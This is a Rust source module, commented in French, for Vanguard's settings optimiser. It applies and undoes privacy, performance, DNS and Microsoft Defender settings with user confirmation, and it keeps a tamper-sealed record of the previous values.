//! Optimiser : réglages de confidentialité, de performance et de confort, écrits pour Vanguard. Chaque réglage montre
//! son état réel, explique ce qu'il change et s'applique après accord, avec un point de restauration si le système est
//! touché. Il s'annule exactement : la valeur d'avant est notée au moment du changement, puis remise telle quelle ;
//! sans note (réglage fait ailleurs), c'est la valeur d'un système neuf qui revient. Aucun réglage n'affaiblit la
//! sécurité, et ceux qui ne conviennent pas à cette machine (version du système, bureau, matériel) ne sont pas proposés.

pub(crate) mod annulables;
#[cfg(windows)]
pub(crate) mod defender;
mod demarrage;
#[cfg(target_os = "linux")]
pub(crate) mod linux;
#[cfg(target_os = "macos")]
mod macos;
#[cfg(windows)]
mod windows;

pub(crate) use annulables::Geste;
pub use demarrage::menu as programmes_au_demarrage;
pub use demarrage::{
    remettre as remettre_au_demarrage, retirables as demarrage_retirables, retirer as retirer_du_demarrage,
};
#[cfg(target_os = "linux")]
pub(crate) use linux::OLLAMA_VANGUARD;

#[cfg(target_os = "linux")]
use linux as systeme;
#[cfg(target_os = "macos")]
use macos as systeme;
#[cfg(all(windows, test))]
pub(crate) use systeme::{geste_de_protection, reglage_protege};
#[cfg(windows)]
use windows as systeme;

use std::borrow::Cow;
use std::collections::BTreeMap;

use crate::selection::{Case, cocher};
use crate::ui::*;

/// Valeur d'un réglage, telle qu'on la lit et qu'on la remet. `None` : absente (valeur du registre, fichier,
/// préférence jamais définie).
pub type Valeur = Option<String>;

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Categorie {
    Confidentialite,
    // Rien dans cette catégorie pour macOS, pour l'instant.
    #[cfg_attr(target_os = "macos", allow(dead_code))]
    Performance,
    Confort,
    /// Protections de Defender qui bloquent les attaques (Windows seulement).
    #[cfg_attr(not(windows), allow(dead_code))]
    Protection,
}

impl Categorie {
    pub fn titre(self) -> &'static str {
        match self {
            Categorie::Confidentialite => tr!("Confidentialité", "Privacy"),
            Categorie::Performance => tr!("Performance et fiabilité", "Performance and reliability"),
            Categorie::Confort => tr!("Confort et fichiers", "Comfort and files"),
            Categorie::Protection => tr!("Protection contre les attaques", "Protection against attacks"),
        }
    }
}

/// Un réglage proposé par Vanguard.
pub struct Reglage {
    /// Nom stable, noté dans l'historique pour pouvoir annuler. Construit à la demande pour un programme au
    /// démarrage (« demarrage:… »), fixe pour le catalogue.
    pub id: Cow<'static, str>,
    pub categorie: Categorie,
    pub titre: Cow<'static, str>,
    /// Ce que ça change, et pourquoi.
    pub effet: &'static str,
    /// Le revers, s'il y en a un.
    pub prudence: Option<&'static str>,
    /// Fait partie des réglages recommandés (sans revers pour la plupart des gens).
    pub recommande: bool,
    pub changements: Vec<systeme::Changement>,
}

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Etat {
    Fait,
    AFaire,
    EnPartie,
}

fn etat(r: &Reglage) -> Etat {
    let bons = r.changements.iter().filter(|c| c.lire() == c.cible()).count();
    match bons {
        0 => Etat::AFaire,
        n if n == r.changements.len() => Etat::Fait,
        _ => Etat::EnPartie,
    }
}

/// Valeurs d'avant de chaque réglage appliqué par Vanguard, dans l'ordre de ses changements.
#[derive(serde::Serialize, serde::Deserialize, Default)]
struct Historique {
    reglages: BTreeMap<String, Avant>,
    /// Les notes de Gaming d'avant (jeux.json) ont été reprises : scellé avec les notes, pour que la reprise n'ait
    /// lieu qu'une fois. Vanguard n'écrit plus jeux.json ; un jeux.json qui revient ensuite vient d'ailleurs, et le
    /// reprendre le scellerait comme si Vanguard l'avait noté.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    jeux_repris: bool,
    /// Les protections que Vanguard a posées (l'id d'un réglage de Defender, ou le geste « defender|np » noté par la
    /// 0.87) : sans valeur d'avant, elles ne se défont pas. Seul le bilan s'en sert, pour dire plus fort une
    /// protection coupée ensuite ; une marque forgée ne fait que cela.
    #[serde(default, skip_serializing_if = "std::collections::BTreeSet::is_empty")]
    protections: std::collections::BTreeSet<String>,
}

#[derive(serde::Serialize, serde::Deserialize, Default, Clone, Debug, PartialEq)]
struct Avant {
    date: String,
    valeurs: Vec<Valeur>,
    /// Hors du catalogue (une correction du bilan, un réglage pour jouer) : ce qu'elle fait, montré pour l'annuler.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    titre: Option<String>,
    /// Hors du catalogue : ce que désigne chaque valeur (`annulables::Geste`), pour rebâtir le réglage après un
    /// redémarrage. Absent des notes du catalogue, que le code rebâtit seul.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    gestes: Vec<String>,
}

fn charger() -> Historique {
    charger_dans(&crate::reseau::dossier_local())
}

/// Met de côté, intact, un fichier de valeurs d'avant qu'on ne relit pas : jamais écrasé en silence. Une copie par
/// contenu (son nom vient de l'empreinte) : le fichier est relu à chaque menu, et une copie datée à chaque lecture
/// remplissait le dossier. Rend la copie la première fois dans ce processus, pour ne la dire qu'une fois ; `None`
/// ensuite.
fn mettre_de_cote(chemin: &std::path::Path, genre: &str) -> Option<std::path::PathBuf> {
    static DITES: std::sync::Mutex<std::collections::BTreeSet<std::path::PathBuf>> =
        std::sync::Mutex::new(std::collections::BTreeSet::new());
    let octets = std::fs::read(chemin).unwrap_or_default();
    let empreinte = blake3::hash(&octets).to_hex();
    let copie = chemin.with_extension(format!("{genre}-{}.json", &empreinte[..16]));
    if !copie.exists() {
        let _ = std::fs::write(&copie, &octets);
    }
    let mut dites = DITES.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
    dites.insert(copie.clone()).then_some(copie)
}

/// L'historique du dossier `dossier`, d'après son sceau (`sceau::REGLAGES`) : ses valeurs sont remises en
/// administrateur, et tout programme du compte peut réécrire le fichier. Changé hors de Vanguard, il ne vaut rien
/// (aucune valeur n'en est remise, il est mis de côté et c'est dit). Accepté tel quel, il ne sert que s'il a été
/// repris d'une version d'avant par une mise à jour connue (`sceau::repris_dans`), et il n'est jamais rescellé à la
/// lecture : il reste « adopté », et le bilan le dit (COM-ETA-001), jusqu'à ce que Vanguard écrive lui-même une note.
/// Toute autre adoption (premier usage, sceaux.json effacé) ne vaut rien, comme pour wifi-public.json et
/// sauvegarde.json : un fichier posé là par un autre programme ferait remettre ses valeurs en administrateur.
/// Les tests ont chacun leur dossier : l'un réécrirait sinon celui qu'un autre lit
/// (sous Windows, un fichier ouvert ne se remplace pas).
fn charger_dans(dossier: &std::path::Path) -> Historique {
    // Les notes de Gaming d'avant (jeux.json) sont reprises ici, une fois : seulement dans un historique cru, jamais
    // par-dessus un fichier falsifié ou illisible.
    // Jamais par-dessus un fichier adopté non plus : l'enregistrement de la reprise le rescellerait, et il perdrait
    // la marque que le bilan dit (COM-ETA-001). Les notes des corrections devenues des protections partent aussi
    // (`retirer_protections`) : en mémoire seulement dans un fichier adopté.
    match lire_dans(dossier) {
        Some((mut h, adopte)) => {
            if !adopte {
                annulables::reprendre_jeux(&mut h, dossier);
            }
            annulables::retirer_protections(&mut h, dossier, !adopte);
            h
        }
        None => Historique::default(),
    }
}

/// Les réglages et les protections que Vanguard a posés, lus sans rien écrire ni rien dire : les id des notes, leurs
/// gestes, et les marques des protections (`Historique::protections`). Le bilan s'en sert pour voir une protection
/// coupée après coup. Des notes falsifiées ou illisibles ne comptent pas : COM-ETA-001 le dit déjà. Un fichier
/// adopté compte, même hors d'une mise à jour (contrairement à `lire_dans`) : ce qu'on y lit ne fait jamais rien
/// remettre, au pire une alerte plus forte sur une protection de Defender coupée, dont la correction la rallume.
#[cfg(windows)]
pub(crate) fn reglages_poses() -> Vec<String> {
    use crate::sceau::Lecture;
    match crate::sceau::lire_dans(&crate::reseau::dossier_local(), crate::sceau::REGLAGES) {
        Lecture::Intact(o) | Lecture::Adopte(o) => {
            serde_json::from_str::<Historique>(String::from_utf8_lossy(&o).trim_start_matches('\u{feff}'))
                .map(|h| {
                    h.reglages
                        .into_iter()
                        .flat_map(|(id, a)| std::iter::once(id).chain(a.gestes))
                        .chain(h.protections)
                        .collect()
                })
                .unwrap_or_default()
        }
        _ => Vec::new(),
    }
}

/// Retient que Vanguard a posé cette protection de Defender (une correction du bilan, `machine::windows::defender`) :
/// une marque, sans valeur d'avant, pour que le bilan dise plus fort qu'elle a été coupée ensuite.
#[cfg(windows)]
pub(crate) fn retenir_protection(id: &str) {
    retenir_protection_dans(id, &crate::reseau::dossier_local());
}

#[cfg(windows)]
fn retenir_protection_dans(id: &str, dossier: &std::path::Path) {
    if !systeme::reglage_protege(id) {
        return;
    }
    let mut h = charger_dans(dossier);
    if h.protections.insert(id.to_string()) {
        sauver_dans(&h, dossier);
    }
}

/// L'historique tel que lu, et s'il est adopté (accepté tel quel, sans que Vanguard l'ait écrit) ; `None` s'il ne
/// vaut rien (falsifié, illisible : c'est dit).
fn lire_dans(dossier: &std::path::Path) -> Option<(Historique, bool)> {
    use crate::sceau::Lecture;
    let chemin = dossier.join(crate::sceau::REGLAGES);
    let (octets, adopte) = match crate::sceau::lire_dans(dossier, crate::sceau::REGLAGES) {
        // Disparu (Inconnu) : rien à remettre, et rien de faux non plus ; la disparition est dite par les sceaux.
        Lecture::Absent | Lecture::Inconnu => return Some((Historique::default(), false)),
        Lecture::Intact(o) => (o, false),
        Lecture::Adopte(o) if crate::sceau::repris_dans(dossier, crate::sceau::REGLAGES) => (o, true),
        Lecture::Adopte(_) => {
            if let Some(copie) = mettre_de_cote(&chemin, "adopte") {
                tre!(
                    "Attention : valeurs d'avant des réglages acceptées sans sceau d'avant : aucune n'est remise. Copie gardée : {}",
                    "Warning: previous setting values accepted without an earlier seal: none is restored. Copy kept: {}",
                    copie.display()
                );
            }
            return None;
        }
        Lecture::Falsifie(_) => {
            if let Some(copie) = mettre_de_cote(&chemin, "falsifie") {
                tre!(
                    "Attention : valeurs d'avant des réglages changées hors de Vanguard : aucune n'est remise. Copie gardée : {}",
                    "Warning: previous setting values changed outside Vanguard: none is restored. Copy kept: {}",
                    copie.display()
                );
            }
            return None;
        }
        Lecture::Illisible(e) => {
            tre!(
                "Attention : valeurs d'avant des réglages illisibles ({e}).",
                "Warning: previous setting values unreadable ({e})."
            );
            return None;
        }
    };
    let texte = String::from_utf8_lossy(&octets);
    match serde_json::from_str::<Historique>(texte.trim_start_matches('\u{feff}')) {
        Ok(h) => Some((h, adopte)),
        Err(e) => {
            // Jamais écraser des valeurs d'avant qu'on ne sait pas relire : le fichier est mis de côté, intact.
            if let Some(copie) = mettre_de_cote(&chemin, "illisible") {
                tre!(
                    "Attention : valeurs d'avant des réglages illisibles ({e}). Copie gardée : {}",
                    "Warning: previous setting values unreadable ({e}). Copy kept: {}",
                    copie.display()
                );
            }
            None
        }
    }
}

/// Écrit l'historique d'un bloc, scellé (fichier temporaire, puis renommé) : une coupure ou un Ctrl-C laissent
/// l'ancien ou le nouveau, jamais un fichier tronqué qui, relu vide, ferait perdre toutes les valeurs d'avant.
fn sauver_dans(h: &Historique, dossier: &std::path::Path) -> bool {
    let ecrit = serde_json::to_string_pretty(h)
        .map_err(std::io::Error::other)
        .and_then(|texte| crate::sceau::ecrire_dans(dossier, crate::sceau::REGLAGES, texte.as_bytes()));
    if let Err(e) = &ecrit {
        tre!(
            "Attention : valeurs d'avant des réglages non enregistrées ({e}).",
            "Warning: previous setting values not saved ({e})."
        );
    }
    ecrit.is_ok()
}

/// La note d'un réglage, seulement si chacune de ses valeurs a une forme que ce changement peut écrire : un ensemble
/// fermé (état d'un service, booléen), une forme stricte (adresse IP, nombre, identifiant). Une valeur d'une autre
/// forme vient d'ailleurs que de Vanguard : la note entière est refusée, et ce sont les valeurs d'un système neuf,
/// écrites dans le code, qui reviennent.
fn note_admise<'a>(r: &Reglage, h: &'a Historique) -> Option<&'a Avant> {
    let a = h.reglages.get(r.id.as_ref())?;
    (a.valeurs.len() <= r.changements.len()
        && r.changements
            .iter()
            .zip(&a.valeurs)
            .all(|(c, v)| c.valeur_admise(v.as_deref())))
    .then_some(a)
}

/// Une liste d'adresses IP séparées par des virgules (vide : aucune), telle qu'un réglage de DNS la note.
#[cfg_attr(not(any(target_os = "linux", windows, target_os = "macos")), allow(dead_code))]
pub(crate) fn adresses_ip(liste: &str) -> bool {
    liste
        .split(',')
        .filter(|s| !s.is_empty())
        .all(|s| s.parse::<std::net::IpAddr>().is_ok())
}

/// Une valeur de préférence simple : un mot (« 0 », « no », « true »), éventuellement entre guillemets droits, sans
/// rien qu'un fichier de configuration ou un shell lirait autrement.
#[cfg_attr(not(target_os = "linux"), allow(dead_code))]
pub(crate) fn jeton_simple(v: &str) -> bool {
    let nu = v.strip_prefix('"').and_then(|r| r.strip_suffix('"')).unwrap_or(v);
    nu.len() <= 64 && nu.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c))
}

/// Une valeur de GNOME (gsettings) simple : booléen, nombre (signé, ou « uint32 5 »), ou mot entre apostrophes.
#[cfg_attr(not(target_os = "linux"), allow(dead_code))]
pub(crate) fn gvariant_simple(v: &str) -> bool {
    let nombre = |t: &str| {
        let t = t.strip_prefix('-').unwrap_or(t);
        !t.is_empty() && t.len() <= 20 && t.chars().all(|c| c.is_ascii_digit())
    };
    let mot = |t: &str| {
        t.strip_prefix('\'')
            .and_then(|r| r.strip_suffix('\''))
            .is_some_and(|m| m.len() <= 64 && m.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c)))
    };
    matches!(v, "true" | "false")
        || nombre(v)
        || v.split_once(' ')
            .is_some_and(|(t, n)| matches!(t, "uint32" | "int32" | "uint64" | "int64" | "double") && nombre(n))
        || mot(v)
}

/// Valeurs à remettre pour annuler `r` : celles notées avant le changement, si elles sont admises, sinon celles
/// d'un système neuf.
fn valeurs_d_avant(r: &Reglage, h: &Historique) -> Vec<Valeur> {
    let notees = note_admise(r, h);
    r.changements
        .iter()
        .enumerate()
        .map(|(i, c)| {
            notees
                .and_then(|a| a.valeurs.get(i).cloned())
                .unwrap_or_else(|| c.defaut())
        })
        .collect()
}

/// Les valeurs à remettre pour annuler `r` sont-elles relues en place ?
fn remis_en_place(r: &Reglage, h: &Historique, couverts: &[&str]) -> bool {
    let gestes = h.reglages.get(r.id.as_ref()).map_or(&[][..], |a| a.gestes.as_slice());
    r.changements
        .iter()
        .zip(valeurs_d_avant(r, h))
        .enumerate()
        .all(|(j, (c, v))| c.lire() == v || gestes.get(j).is_some_and(|g| couverts.contains(&g.as_str())))
}

/// Applique et annule, d'un seul passage (un point de restauration, une demande administrateur), puis met
/// l'historique à jour. Retourne la réussite de chaque réglage appliqué, puis de chaque réglage annulé.
fn executer(a_faire: &[&Reglage], a_annuler: &[&Reglage], h: &mut Historique) -> (Vec<bool>, Vec<bool>) {
    let (faits, annules, _) = executer_avec(a_faire, a_annuler, h, &[], &crate::reseau::dossier_local());
    (faits, annules)
}

/// Comme `executer`, avec `en_plus` : les commandes d'autres annulations (un blocage), lancées dans la même demande
/// administrateur, pour que « Tout remettre comme avant » n'en ouvre qu'une. Rend aussi la réussite de chacune.
fn executer_avec(
    a_faire: &[&Reglage],
    a_annuler: &[&Reglage],
    h: &mut Historique,
    en_plus: &[Vec<String>],
    dossier: &std::path::Path,
) -> (Vec<bool>, Vec<bool>, Vec<bool>) {
    let date = chrono::Local::now().format("%Y-%m-%d %H:%M").to_string();
    // Valeurs d'avant notées avant de toucher à quoi que ce soit : la plus ancienne reste, pour revenir à l'état
    // d'origine même après plusieurs passages.
    for r in a_faire {
        // Une protection n'a pas de note : elle ne se défait pas, seule sa marque est retenue une fois posée.
        if systeme::reglage_protege(&r.id) {
            continue;
        }
        // Une note refusée (forme inattendue) ne garde pas sa place : celle de maintenant la remplace.
        if note_admise(r, h).is_none() {
            h.reglages.remove(r.id.as_ref());
        }
        h.reglages.entry(r.id.to_string()).or_insert_with(|| Avant {
            date: date.clone(),
            valeurs: r.changements.iter().map(systeme::Changement::lire).collect(),
            ..Avant::default()
        });
    }
    // Jamais une protection défaite, même demandée : seule une valeur notée se remet, et une protection n'en a pas.
    // Elle compte comme non remise, à sa place dans ce que l'appelant a demandé.
    let demandes = a_annuler;
    let a_annuler: Vec<&Reglage> = a_annuler
        .iter()
        .copied()
        .filter(|r| !systeme::reglage_protege(&r.id))
        .collect();
    let a_annuler = a_annuler.as_slice();
    // Sans valeurs d'avant notées, un réglage ne pourrait plus s'annuler exactement : rien n'est changé.
    if !a_faire.is_empty() && !sauver_dans(h, dossier) {
        return (
            vec![false; a_faire.len()],
            vec![false; demandes.len()],
            vec![false; en_plus.len()],
        );
    }
    let mut groupes: Vec<Vec<(&systeme::Changement, Valeur)>> = a_faire
        .iter()
        .map(|r| r.changements.iter().map(|c| (c, c.cible())).collect())
        .collect();
    for r in a_annuler {
        groupes.push(r.changements.iter().zip(valeurs_d_avant(r, h)).collect());
    }
    let (resultats, plus) = systeme::ecrire_avec(&groupes, en_plus);
    let (faits, annules) = resultats.split_at(a_faire.len().min(resultats.len()));
    // Échec sans aucun changement : la note n'a pas lieu d'être (en partie fait, elle reste pour pouvoir annuler).
    for (r, ok) in a_faire.iter().zip(faits) {
        let pose = *ok || etat(r) != Etat::AFaire;
        if systeme::reglage_protege(&r.id) {
            if pose {
                h.protections.insert(r.id.to_string());
            }
        } else if !pose {
            h.reglages.remove(r.id.as_ref());
        }
    }
    // Annulé = les valeurs d'avant relues en place, pas seulement des commandes sans erreur : une valeur qu'aucune
    // commande ne sait remettre laisse la note, pour pouvoir réessayer.
    // Deux notes sur la même cible, défaites ensemble de la plus récente à la plus ancienne : la plus ancienne écrit
    // en dernier l'état d'avant les deux. La plus récente ne relit donc pas le sien (l'état d'entre les deux), et
    // c'est voulu ; une valeur couverte par une note plus ancienne relue en place compte comme remise. Sinon sa note
    // restait, avec un faux ✖, et la réessayer ramenait l'état d'entre les deux.
    let mut remis = vec![false; a_annuler.len()];
    let mut couverts: Vec<&str> = Vec::new();
    for i in (0..a_annuler.len()).rev() {
        let r = a_annuler[i];
        remis[i] = annules.get(i) == Some(&true) && remis_en_place(r, h, &couverts);
        if remis[i] {
            couverts.extend(
                h.reglages
                    .get(r.id.as_ref())
                    .into_iter()
                    .flat_map(|a| a.gestes.iter().map(String::as_str)),
            );
        }
    }
    for (r, _) in a_annuler.iter().zip(&remis).filter(|(_, remis)| **remis) {
        h.reglages.remove(r.id.as_ref());
    }
    sauver_dans(h, dossier);
    let mut remis = remis.into_iter();
    let remis = demandes
        .iter()
        .map(|r| !systeme::reglage_protege(&r.id) && remis.next().unwrap_or(false))
        .collect();
    (faits.to_vec(), remis, plus)
}

fn libelle(e: Etat, par_vanguard: bool) -> &'static str {
    match (e, par_vanguard) {
        (Etat::Fait, true) => tr!("fait par Vanguard", "done by Vanguard"),
        (Etat::Fait, false) => tr!("déjà fait", "already done"),
        (Etat::EnPartie, _) => tr!("en partie", "partly"),
        (Etat::AFaire, _) => tr!("à faire", "to do"),
    }
}

/// Ce qui va changer, montré avant de demander : chaque réglage, ses changements, et son revers coupé pour tenir
/// dans `LARGEUR` (d'une traite, le terminal le coupait au milieu des mots).
fn a_changer(a_faire: &[&Reglage], a_annuler: &[&Reglage], h: &Historique) -> Vec<String> {
    let mut lignes = Vec::new();
    if !a_faire.is_empty() {
        lignes.push(trf!("\n  {GRAS}À appliquer{RESET}", "\n  {GRAS}To apply{RESET}"));
        for r in a_faire {
            lignes.push(format!("    {VERT}+{RESET} {}", r.titre));
            for c in &r.changements {
                // Un réglage peut reprendre un nom venu d'ailleurs (fichier d'autostart, valeur StartupApproved).
                lignes.push(format!(
                    "        {GRIS}{}{RESET}",
                    crate::ui::affichable(&c.decrire(c.cible().as_deref()))
                ));
            }
            if let Some(p) = r.prudence {
                let mut morceaux = envelopper(p, LARGEUR - 10).into_iter();
                lignes.extend(morceaux.next().map(|m| format!("        ⚠ {m}")));
                lignes.extend(morceaux.map(|m| format!("          {m}")));
            }
        }
    }
    if !a_annuler.is_empty() {
        lignes.push(trf!("\n  {GRAS}À annuler{RESET}", "\n  {GRAS}To undo{RESET}"));
        for r in a_annuler {
            let note = if note_admise(r, h).is_some() {
                tr!("valeurs d'avant remises", "previous values restored")
            } else if h.reglages.contains_key(r.id.as_ref()) {
                tr!(
                    "note refusée, valeurs d'un système neuf",
                    "note refused, values of a fresh system"
                )
            } else {
                tr!("valeurs d'un système neuf", "values of a fresh system")
            };
            lignes.push(format!("    − {} {GRIS}({note}){RESET}", r.titre));
            for (c, v) in r.changements.iter().zip(valeurs_d_avant(r, h)) {
                lignes.push(format!(
                    "        {GRIS}{}{RESET}",
                    crate::ui::affichable(&c.decrire(v.as_deref()))
                ));
            }
        }
    }
    lignes
}

/// Montre ce qui va changer, demande l'accord, applique, puis relit l'état de chaque réglage.
fn confirmer_et_executer(a_faire: &[&Reglage], a_annuler: &[&Reglage]) {
    let mut h = charger();
    for l in a_changer(a_faire, a_annuler, &h) {
        println!("{l}");
    }
    if !demander(tr!(
        "\n  Faire ces changements ? [o/N] : ",
        "\n  Make these changes? [y/N]: "
    ))
    .oui()
    {
        trp!("  Annulé.", "  Cancelled.");
        return;
    }
    let (faits, annules) = executer(a_faire, a_annuler, &mut h);
    println!();
    for (r, ok) in a_faire.iter().zip(&faits).chain(a_annuler.iter().zip(&annules)) {
        // L'état relu après coup : c'est lui qui dit si le changement a pris.
        let e = etat(r);
        let voulu_fait = a_faire.iter().any(|f| f.id == r.id);
        if *ok && (e == Etat::Fait) == voulu_fait {
            println!("  {VERT}✔{RESET} {}", r.titre);
        } else {
            trp!(
                "  ✖ {} : pas changé, voir le message ci-dessus",
                "  ✖ {}: not changed, see the message above",
                r.titre
            );
        }
    }
    let touches: Vec<&Reglage> = a_faire.iter().chain(a_annuler).copied().collect();
    systeme::apres(&touches);
}

/// Cette catégorie a-t-elle au moins un réglage pour cette machine ?
pub fn a_des_reglages(categorie: Categorie) -> bool {
    systeme::catalogue().iter().any(|r| r.categorie == categorie)
}

/// L'en-tête de la liste à cocher d'une catégorie, sur deux lignes : plus large que `LARGEUR`, il passait sur deux
/// rangées du terminal et décalait la liste, qui compte une rangée par ligne.
fn entete(categorie: Categorie) -> Vec<String> {
    vec![
        String::new(),
        ligne_titre(categorie.titre()),
        trf!(
            "  {GRIS}Coché = réglage en place. Ce que vous cochez s'applique,{RESET}\n  {GRIS}ce que vous décochez s'annule.{RESET}",
            "  {GRIS}Checked = setting in place. What you check is applied,{RESET}\n  {GRIS}what you uncheck is undone.{RESET}"
        ),
        String::new(),
    ]
}

/// Si l'accès contrôlé aux dossiers de Defender bloque (mode 1) : les dossiers qu'on lui a ajoutés, en plus de ceux
/// qu'il protège d'office. `None` s'il ne bloque pas.
#[cfg(windows)]
pub fn dossiers_controles() -> Option<Vec<String>> {
    let e = defender::etat();
    (e.actif && e.valeur(defender::Pref::DossiersControles).as_deref() == Some("mp:1"))
        .then(|| e.dossiers_ajoutes().to_vec())
}

/// Les protections de Defender : seulement s'il est l'antivirus actif, puisque sinon ses blocages ne s'appliquent
/// pas (un autre antivirus le met en mode passif).
pub fn protection() {
    #[cfg(windows)]
    if !windows::defender_actif() {
        titre(Categorie::Protection.titre());
        afficher_aligne(
            "  ",
            tr!(
                "Microsoft Defender n'est pas l'antivirus actif ici (coupé, ou remplacé par un autre antivirus) : ses blocages ne s'appliqueraient pas. Rien à proposer.",
                "Microsoft Defender is not the active antivirus here (off, or replaced by another antivirus): its blocking would not apply. Nothing to offer."
            ),
            2,
            "",
        );
        return;
    }
    menu(Categorie::Protection);
}

/// Une catégorie : liste à cocher. Coché = réglage en place ; cocher applique, décocher annule.
pub fn menu(categorie: Categorie) {
    let reglages: Vec<Reglage> = systeme::catalogue()
        .into_iter()
        .filter(|r| r.categorie == categorie)
        .collect();
    if reglages.is_empty() {
        titre(categorie.titre());
        trp!(
            "  {GRIS}Rien dans cette catégorie pour ce système.{RESET}",
            "  {GRIS}Nothing in this category for this system.{RESET}"
        );
        return;
    }
    let h = charger();
    let etats: Vec<Etat> = reglages.iter().map(etat).collect();
    let cases: Vec<Case> = reglages
        .iter()
        .zip(&etats)
        .map(|(r, e)| Case {
            texte: r.titre.to_string(),
            precision: libelle(
                *e,
                h.reglages.contains_key(r.id.as_ref()) || h.protections.contains(r.id.as_ref()),
            )
            .to_string(),
            detail: match r.prudence {
                Some(p) => format!("{} ⚠ {p}", r.effet),
                None => r.effet.to_string(),
            },
            cochee: *e == Etat::Fait,
            recommandee: r.recommande,
            // Une protection en place ne se décoche pas : Vanguard ne la défait pas (`reglage_protege`).
            fixe: *e == Etat::Fait && systeme::reglage_protege(&r.id),
        })
        .collect();
    let Some(voulu) = cocher(&entete(categorie), &cases) else {
        return;
    };
    let a_faire: Vec<&Reglage> = reglages
        .iter()
        .zip(&etats)
        .zip(&voulu)
        .filter(|((_, e), v)| **v && **e != Etat::Fait)
        .map(|((r, _), _)| r)
        .collect();
    let a_annuler: Vec<&Reglage> = reglages
        .iter()
        .zip(&etats)
        .zip(&voulu)
        .filter(|((_, e), v)| !**v && **e == Etat::Fait)
        .map(|((r, _), _)| r)
        .collect();
    if a_faire.is_empty() && a_annuler.is_empty() {
        trp!("  {GRIS}Rien à changer.{RESET}", "  {GRIS}Nothing to change.{RESET}");
        return;
    }
    confirmer_et_executer(&a_faire, &a_annuler);
}

/// Tous les réglages recommandés qui ne sont pas encore en place, en une fois.
pub fn recommandes() {
    titre(tr!("Réglages recommandés", "Recommended settings"));
    let reglages = systeme::catalogue();
    let a_faire: Vec<&Reglage> = reglages
        .iter()
        .filter(|r| r.recommande && etat(r) != Etat::Fait)
        .collect();
    if a_faire.is_empty() {
        trp!(
            "  {VERT}✔{RESET} Les réglages recommandés sont déjà en place.",
            "  {VERT}✔{RESET} The recommended settings are already in place."
        );
        return;
    }
    let sans_revers = tr!(
        "Sans revers pour la plupart des gens, et chacun s'annule depuis sa catégorie.",
        "No downside for most people, and each one can be undone from its category."
    );
    afficher_aligne("  ", sans_revers, 2, "");
    confirmer_et_executer(&a_faire, &[]);
}

/// Ce que dit un réglage de DNS : les serveurs imposés, ou ceux de la box. `avec_box` : ceux de la box servent encore
/// après les serveurs listés.
fn texte_dns(serveurs: &[&str], avec_box: bool) -> String {
    match (serveurs.is_empty(), avec_box) {
        (true, _) => tr!("DNS automatique : celui du routeur", "automatic DNS: the router's").to_string(),
        (false, false) => trf!("DNS : {}", "DNS: {}", serveurs.join(", ")),
        (false, true) => trf!(
            "DNS : {}, puis celui du routeur",
            "DNS: {}, then the router's",
            serveurs.join(", ")
        ),
    }
}

/// Le réglage du DNS le plus rapide (outil Réseau et Internet › DNS) : construit à la demande, hors des catégories,
/// noté et annulé comme les autres.
const DNS: &str = "dns_rapide";

fn reglage_dns(c: systeme::Changement) -> Reglage {
    Reglage {
        id: Cow::Borrowed(DNS),
        // Hors des menus de catégorie (il n'est pas au catalogue) : la catégorie ne sert pas.
        categorie: Categorie::Confort,
        titre: tr!("DNS le plus rapide", "Fastest DNS").into(),
        effet: tr!(
            "Les noms de sites sont traduits par le DNS le plus rapide mesuré ici.",
            "Site names are translated by the fastest DNS measured here."
        ),
        prudence: None,
        recommande: false,
        changements: vec![c],
    }
}

/// Les réglages hors catalogue que Vanguard a appliqués et pas encore annulés : ceux dont une note garde la valeur
/// d'avant (le DNS, les programmes retirés du démarrage).
fn hors_catalogue(h: &Historique) -> Vec<Reglage> {
    let mut l: Vec<Reglage> = h
        .reglages
        .get(DNS)
        .and_then(|a| a.valeurs.first().cloned().flatten())
        .and_then(|v| systeme::Changement::dns_note(&v))
        .map(reglage_dns)
        .into_iter()
        .collect();
    l.extend(demarrage::notes(h));
    l.extend(annulables::rebatis(h));
    l
}

/// Les réglages du catalogue qui ont une note.
fn catalogue_note(h: &Historique) -> Vec<Reglage> {
    systeme::catalogue()
        .into_iter()
        .filter(|r| h.reglages.contains_key(r.id.as_ref()))
        .collect()
}

/// Le DNS changé par Vanguard, s'il l'a fait : (date du changement, réseau concerné : connexion, carte ou service).
pub fn dns_change() -> Option<(String, String)> {
    let h = charger();
    let a = h.reglages.get(DNS)?;
    let (reseau, _) = a.valeurs.first()?.as_deref()?.split_once('\n')?;
    Some((a.date.clone(), reseau.to_string()))
}

/// Règle le DNS de la connexion principale sur ces serveurs, après accord, comme un réglage : la valeur d'avant est
/// notée, et « Tout remettre comme avant » la remet. Erreur : pourquoi ce n'est pas possible ici.
pub fn appliquer_dns(serveurs4: &[&str], serveurs6: &[&str]) -> Result<(), String> {
    // Le mode Wi-Fi public remettra, en s'éteignant, le DNS qu'il a trouvé : il écraserait ce choix.
    if crate::reseau::wifi_public::tient_le_dns() {
        return Err(tr!(
            "Le mode Wi-Fi public tient le DNS : éteignez-le d'abord (« vanguard wifi-public off »).",
            "Public Wi-Fi mode holds the DNS: turn it off first (“vanguard public-wifi off”)."
        )
        .to_string());
    }
    let c = systeme::dns_principal(serveurs4, serveurs6)?;
    // Une seule valeur d'avant se garde : celle d'un autre réseau doit d'abord revenir.
    if let Some((_, reseau)) = dns_change()
        && Some(reseau.as_str()) != c.identite_dns()
    {
        return Err(tr!(
            "Vanguard a déjà changé le DNS d'une autre connexion : remettez-le d'abord (Bloquer et réagir › Tout remettre comme avant).",
            "Vanguard already changed the DNS of another connection: put it back first (Block and respond › Put everything back)."
        )
        .to_string());
    }
    let r = reglage_dns(c);
    if etat(&r) == Etat::Fait {
        trp!(
            "  {VERT}✔{RESET} Ce DNS est déjà en place.",
            "  {VERT}✔{RESET} This DNS is already in place."
        );
        return Ok(());
    }
    confirmer_et_executer(&[&r], &[]);
    Ok(())
}

/// Le DNS protecteur du mode Wi-Fi public (`reseau::wifi_public`), par le même changement que « DNS le plus
/// rapide » mais noté dans l'état scellé du mode, pas dans reglages.json : (connexion, valeur actuelle, valeur
/// voulue), sur la connexion de la route par défaut. Erreur : pourquoi ce n'est pas possible ici.
